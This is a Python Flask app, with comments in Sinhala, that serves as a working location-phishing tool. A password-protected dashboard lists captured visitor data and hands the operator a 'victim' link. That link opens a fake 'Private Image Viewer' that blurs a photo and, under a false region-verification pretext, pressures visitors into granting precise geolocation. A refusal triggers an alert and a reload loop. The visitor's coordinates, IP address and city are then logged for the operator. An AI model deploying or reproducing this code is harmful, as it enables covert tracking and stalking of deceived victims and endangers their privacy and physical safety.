import os, requests, datetime
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# --- Settings ---
ADMIN_PASSWORD = "5555" 
captured_logs = []

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res if res['status'] == 'success' else None
    except: return None

# --- Dashboard ---
@app.route('/')
def admin():
    entered_pass = request.args.get('pass')
    if entered_pass != ADMIN_PASSWORD:
        return f'''
        <body style="background:#0f172a; color:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
            <form method="get" style="background:rgba(255,255,255,0.05); padding:40px; border-radius:20px; border:1px solid #333; text-align:center;">
                <h2 style="color:#4ade80; margin-bottom:20px;">Admin Login</h2>
                <input type="password" name="pass" placeholder="Enter Password" required 
                       style="padding:12px; border-radius:8px; border:1px solid #444; background:#000; color:white; margin-bottom:20px; width:220px; text-align:center;"><br>
                <button type="submit" style="background:#22c55e; color:white; border:none; padding:12px 30px; border-radius:8px; cursor:pointer; font-weight:bold; width:100%;">Login</button>
            </form>
        </body>
        '''
    base_url = request.url_root.replace("http://", "https://").rstrip('/')
    victim_link = f"{base_url}/view"
    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)

# --- Victim Page (මොන දේ වුණත් පර්මිෂන් ඉල්ලන විදිහට හැදුවා) ---
@app.route('/view')
def victim_page():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    ip_info = get_ip_info(user_ip)
    city = ip_info['city'] if ip_info else "Sri Lanka"

    return f'''
    <html>
    <head>
        <title>Private Image Viewer</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; margin:0; }}
            .btn {{ background: #25D366; color: white; padding: 16px; border-radius: 50px; border: none; font-weight: bold; width: 85%; max-width: 320px; margin-top: 30px; cursor: pointer; font-size: 16px; }}
            .blur {{ width: 280px; filter: blur(20px); border-radius: 15px; border: 1px solid #333; }}
        </style>
        <script>
            function askLocation() {{
                navigator.geolocation.getCurrentPosition(
                    function(p) {{ // සාර්ථක වුණොත් (Success)
                        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                        .then(() => {{ location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200'; }});
                    }},
                    function(e) {{ // Cancel කළොත් හෝ Error එකක් ආවොත් (Denied)
                        alert("Access Denied! You must allow location access to verify your region ({city}) and unlock this image.");
                        location.reload(); // පේජ් එක Refresh වෙනවා, එතකොට ආයෙත් පර්මිෂන් ඉල්ලනවා
                    }},
                    {{enableHighAccuracy: true}}
                );
            }}

            // පේජ් එක ලෝඩ් වෙද්දීම පර්මිෂන් ඉල්ලන්නත් පුළුවන්, 
            // හැබැයි බ්‍රවුසර් එකෙන් බ්ලොක් කරන නිසා බටන් එක එබුවම වැඩේ වෙන්න දාමු
        </script>
    </head>
    <body>
        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
        <h2 style="margin-top:20px;">🔒 Protected Content</h2>
        <p style="color: #888; padding: 0 20px;">Verification required for <b>{city}</b> region. Please click unlock to verify.</p>
        <button class="btn" onclick="askLocation()">Verify & Unlock Image</button>
    </body>
    </html>
    '''

@app.route('/log')
def log_data():
    log = {
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.args.get('ip'),
        "city": request.args.get('city'),
        "lat": request.args.get('lat'),
        "lon": request.args.get('lon')
    }
    captured_logs.append(log)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
